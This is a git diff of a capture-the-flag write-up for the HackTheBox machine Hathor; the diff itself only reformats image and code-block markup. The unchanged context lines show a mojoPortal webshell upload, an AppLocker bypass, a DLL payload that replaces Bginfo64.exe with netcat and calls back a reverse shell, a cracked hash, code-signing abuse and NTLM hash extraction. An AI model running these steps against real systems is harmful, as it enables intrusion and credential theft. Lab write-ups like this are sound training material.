@@ -97,19 +97,19 @@ The first thing we notice is the domain name, which is `hathor.windcorp.htb`. Th
 
 Port 80 shows a corporate page that is still under construction:
 
-<figure><img src="../../../.gitbook/assets/image (2238).png" alt=""><figcaption></figcaption></figure>
+![](<../../../.gitbook/assets/image%20(2238).png>)
 
 At the bottom of the page, there's a link that brings us to a login page on the website:
 
-<figure><img src="../../../.gitbook/assets/image (612).png" alt=""><figcaption></figcaption></figure>
+![](<../../../.gitbook/assets/image%20(612).png>)
 
 Viewing the page source reveals this is a mojoPortal instance:
 
-<figure><img src="../../../.gitbook/assets/image (3337).png" alt=""><figcaption></figcaption></figure>
+![](<../../../.gitbook/assets/image%20(3337).png>)
 
 A quick Google search for mojoPortal exploits and default credentials led to this:
 
-<figure><img src="../../../.gitbook/assets/image (1044).png" alt=""><figcaption></figcaption></figure>
+![](<../../../.gitbook/assets/image%20(1044).png>)
 
 Surprisingly, this worked!
 
@@ -117,31 +117,31 @@ Surprisingly, this worked!
 
 The administrator panel lets us edit the pages and what is shown:
 
-<figure><img src="../../../.gitbook/assets/image (701).png" alt=""><figcaption></figcaption></figure>
+![](<../../../.gitbook/assets/image%20(701).png>)
 
 This is an IIS server, so uploading an `.aspx` reverse shell might work. Head to File Manager > Upload Files:
 
-<figure><img src="../../../.gitbook/assets/image (908).png" alt=""><figcaption></figcaption></figure>
+![](<../../../.gitbook/assets/image%20(908).png>)
 
 When trying to upload, it doesn't work.
 
-<figure><img src="../../../.gitbook/assets/image (3515).png" alt=""><figcaption></figcaption></figure>
+![](<../../../.gitbook/assets/image%20(3515).png>)
 
 If we change it to `cmd.txt`, it works.
 
-<figure><img src="../../../.gitbook/assets/image (1501).png" alt=""><figcaption></figcaption></figure>
+![](<../../../.gitbook/assets/image%20(1501).png>)
 
 Then it shows up here:
 
-<figure><img src="../../../.gitbook/assets/image (102).png" alt=""><figcaption></figcaption></figure>
+![](<../../../.gitbook/assets/image%20(102).png>)
 
 Interestingly, there's a Move function as well, and we can try moving this to be `cmd.aspx`.
 
-<figure><img src="../../../.gitbook/assets/image (1166).png" alt=""><figcaption></figcaption></figure>
+![](<../../../.gitbook/assets/image%20(1166).png>)
 
 We can try to rename it as `cmd.aspx`, and it seems to work:
 
-<figure><img src="../../../.gitbook/assets/image (2368).png" alt=""><figcaption></figcaption></figure>
+![](<../../../.gitbook/assets/image%20(2368).png>)
 
 Turns out this is actually a CVE:
 
@@ -149,7 +149,7 @@ Turns out this is actually a CVE:
 
 Anyways, we can access our webshell using this CVE:
 
-<figure><img src="../../../.gitbook/assets/image (2443).png" alt=""><figcaption></figcaption></figure>
+![](<../../../.gitbook/assets/image%20(2443).png>)
 
 However, getting **ANY** shell fails to work. Similar to Sekhmet (which I actually solved before this), there's some kind of firewall in use here that is blocking us.
 
@@ -163,11 +163,10 @@ powershell.exe -c Get-AppLockerPolicy -Effective -Xml
 
 This would generate a massive string of stuff that we can and cannot execute.
 
-<figure><img src="../../../.gitbook/assets/image (2054).png" alt=""><figcaption></figcaption></figure>
+![](<../../../.gitbook/assets/image%20(2054).png>)
 
 Here is what is allowed for files and binaries:
 
-{% code overflow="wrap" %}
 ```markup
 <FilePathRule Id="059bf360-e712-427a-8255-59d182bc4cd5" Name="%OSDRIVE%\share\scripts\7-zip64.dll" Description="" UserOrGroupSid="S-1-1-0" Action="Allow">
 
@@ -175,7 +174,6 @@ Here is what is allowed for files and binaries:
 
 <AppLockerPolicy Version="1"><RuleCollection Type="Appx" EnforcementMode="Enabled"><FilePublisherRule Id="a9e18c21-ff8f-43cf-b9fc-db40eed693ba" Name="(Default Rule) All signed packaged apps" Description="Allows members of the Everyone group to run packaged apps that are signed." UserOrGroupSid="S-1-1-0" Action="Allow">
 ```
-{% endcode %}
 
 I don't think it's possible to replace these DLLs, and even if for some reason I have write access, I cannot restart these processes. Also, unsigned binaries like `nc.exe` won't run properly.
 
@@ -185,11 +183,11 @@ In this case, we can try some better webshells that don't rely on external binar
 
 Insomnia shell is a fully implemented web shell that can give us a reverse shell without the use of external binaries. We can upload this one and try again.
 
-<figure><img src="../../../.gitbook/assets/image (409).png" alt=""><figcaption></figcaption></figure>
+![](<../../../.gitbook/assets/image%20(409).png>)
 
 Using this, we can get a reverse shell as `web`.
 
-<figure><img src="../../../.gitbook/assets/image (2237).png" alt=""><figcaption></figcaption></figure>
+![](<../../../.gitbook/assets/image%20(2237).png>)
 
 ## GinaWild Shell
 
@@ -254,18 +252,16 @@ dir
 
 Reading the latest one reveals a hash:
 
-{% code overflow="wrap" %}
 ```
 c:\Get-bADpasswords\Accessible\CSVs>type exported_windcorp-13102022-210856.csv
 
 Activity;Password Type;Account Type;Account Name;Account SID;Account password hash;Present in password list(s)
 active;weak;regular;BeatriceMill;S-1-5-21-3783586571-2109290616-3725730865-5992;9cb01504ba0247ad5c6e08f7ccae7903;'leaked-passwords-v7'
 ```
-{% endcode %}
 
 This is crackable:
 
-<figure><img src="../../../.gitbook/assets/image (3811).png" alt=""><figcaption></figcaption></figure>
+![](<../../../.gitbook/assets/image%20(3811).png>)
 
 `!!!!ilovegood17` is the password here.
 
@@ -450,11 +446,9 @@ Access is denied.
 
 I can't read it, meaning this is probably another user. There seems to be a really aggressive script that is cleaning this up every minute, because it wasn't long before this file disappeared. While waiting, I checked the AppLocker policy for the .exe files:
 
-{% code overflow="wrap" %}
 ```markup
 <FilePathRule Id="39b55ed3-c958-4d5c-846e-e338b7387fc9" Name="%OSDRIVE%\share\Bginfo64.exe" Description="" UserOrGroupSid="S-1-1-0" Action="Allow">
 ```
-{% endcode %}
 
 It seems that this file can be run regardless of what it is. Now that we have RCE as another user, let's try to enumerate who this user is and what they can do. Since the `Bginfo64.exe` file can be run, let's see if we can overwrite it with our own file like `nc.exe`.
 
@@ -485,7 +479,6 @@ BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
 
 After a while, it would create those files. Here's the interesting output:
 
-{% code overflow="wrap" %}
 ```
 C:\Users\Public>type whoami.txt
 
@@ -508,7 +501,6 @@ C:\share\Bginfo64.exe NT AUTHORITY\IUSR:(I)(N)
                       BUILTIN\Administrators:(I)(F)
                       BUILTIN\Users:(I)(RX)
 ```
-{% endcode %}
 
 It appears that the user is `ginawild`, and is part of the ITDep group. Also, this user has Write Owner privileges over the `Bginfo64.exe` file. This means we can take over as the owner of the file, replace it with `nc.exe` , change the permissions to let everyone execute it, and then execute it to gain a reverse shell as `ginawild`.
 
@@ -516,18 +508,16 @@ Before doing so, we need to get the file over. SMB wasn't going to work as somet
 
 My final DLL looks something like this:
 
-{% code overflow="wrap" %}
 ```cpp
 system("cmd.exe /c takeown /F C:\\share\\Bginfo64.exe");
 system("cmd.exe /c cacls C:\\share\\Bginfo64.exe /E /G ginawild:F");
 system("cmd.exe /c copy C:\\inetpub\\wwwroot\\Data\\Sites\\1\\Media\\nc.exe C:\\share\\Bginfo64.exe");
 system("cmd.exe /c C:\\share\\Bginfo64.exe -e cmd.exe 10.10.14.13 4444");
 ```
-{% endcode %}
 
 After waiting for a little bit, we will get a shell back!
 
-<figure><img src="../../../.gitbook/assets/image (3183).png" alt=""><figcaption></figcaption></figure>
+![](<../../../.gitbook/assets/image%20(3183).png>)
 
 We can now grab the user flag.
 
@@ -646,22 +636,20 @@ Afterwards, we can re-upload this to SMB and use `copy` to overwrite the existin
 
 Using the above resource, we can run these commands to sign it:
 
-{% code overflow="wrap" %}
 ```powershell
 $pass = ConvertTo-SecureString -String 'abceasyas123' -AsPlainText -Force
 $pfx = Import-PfxCertificate -FilePath 'C:\$Recycle.bin\S-1-5-21-3783586571-2109290616-3725730865-2663\$RLYS3KF.pfx' -Password $pass -CertStoreLocation Cert:\CurrentUser\My
 Get-ChildItem Cert:\CurrentUser\My -CodeSigningCert
 Set-AuthenticodeSignature .\Get-bADpasswords.ps1 $pfx
 ```
-{% endcode %}
 
 This script should let us know that we have imported it:
 
-<figure><img src="../../../.gitbook/assets/image (1152).png" alt=""><figcaption></figcaption></figure>
+![](<../../../.gitbook/assets/image%20(1152).png>)
 
 It should also let us know that we have signed it successfully:
 
-<figure><img src="../../../.gitbook/assets/image (253).png" alt=""><figcaption></figcaption></figure>
+![](<../../../.gitbook/assets/image%20(253).png>)
 
 Then, there's a `run.vbs` script that looks like it executes the file:
 
@@ -676,7 +664,7 @@ WshShell.Run Command
 
 We can simply use `cscript ./run.vbs` to run this, and we would get another reverse shell:
 
-<figure><img src="../../../.gitbook/assets/image (1534).png" alt=""><figcaption></figcaption></figure>
+![](<../../../.gitbook/assets/image%20(1534).png>)
 
 ## Root Shell
 
@@ -684,7 +672,6 @@ We can simply use `cscript ./run.vbs` to run this, and we would get another reve
 
 So this user is in charge of running the script that checks whether there are weak passwords. Witin the script, I found this part here:
 
-{% code overflow="wrap" %}
 ```powershell
 try {
     $ad_users = Get-ADReplAccount -All -Server $domain_controller -NamingContext $naming_context | where { $_.SamAccountType -eq 'User' } | select SamAccountName,SID,Enabled,@{ N="NtHash"; E={ ConvertTo-Hex $_.NTHash }},@{ N="Activity"; E={ if ($_.Enabled) { 'active' } else { 'inactive' } }},@{ N="PrivilegeType"; E={ 'regular' }}
@@ -694,7 +681,6 @@ try {
 	exit
 }
 ```
-{% endcode %}
 
 It appears this user can use `Get-ADReplAccount` to retrieve NTLM hashes for users. I found some cheatsheetys for this command online as well:
 
@@ -738,6 +724,6 @@ $ export KRB5CCNAME=administrator@windcorp.htb.ccache
 
 Then, we can use this ticket to get a shell using this ticket:
 
-<figure><img src="../../../.gitbook/assets/image (3233).png" alt=""><figcaption></figcaption></figure>
+![](<../../../.gitbook/assets/image%20(3233).png>)
 
 Rooted! Although hard, this machine had steps that were simple if the enumeration was done properly. Great machine!
